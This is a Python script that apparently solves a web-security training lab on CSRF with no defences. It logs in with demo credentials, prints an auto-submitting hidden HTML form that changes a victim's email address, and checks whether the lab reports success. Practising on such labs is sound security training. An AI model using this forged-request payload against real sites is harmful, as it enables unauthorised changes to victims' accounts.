import requests
import sys
import urllib3
import time

proxies = {'http':'http://127.0.0.1:8080','https':'http://127.0.0.1:8080'}
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def csrf_no_defence(s, url):
    login_path = '/login'
    data = {'username':'wiener','password':'peter'}
    r = s.post(url+login_path, data=data, verify=False, proxies=proxies)
    poc = change_email(s, url)
    print("(+) Copy below code and paste in body section of exploit server")
    print(poc)
    print("(+) Click on store followed by deliver exploit to victim")
    time.sleep(15)
    r1 = s.post(url+login_path, data=data, verify=False, proxies=proxies)
    if "Congratulations" in r1.text:
        print("(+) CSRF Exploit successful!")
    else:
        print("(-) Error Exploiting CSRF")
    
    

def change_email(s, url):
    email_path = '/my-account/change-email'
    data = {'email':'test1@test.com'}
    response = s.post(url+email_path, data=data, verify=False, proxies=proxies)
    poc = f'''<html>
  
  <body>
    <form action="{url+email_path}" method="POST">
      <input type="hidden" name="email" value="test1&#64;test&#46;com" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>
'''
    return poc

    

if __name__ == '__main__':
    try:
        url=sys.argv[1]
    except IndexError:
        print("Usage: python %s <url> <url>" %sys.argv[0])
        print("Example: python %s example.com exploit.net" %sys.argv[0])
        sys.exit(1)
    s = requests.session()
    csrf_no_defence(s, url)
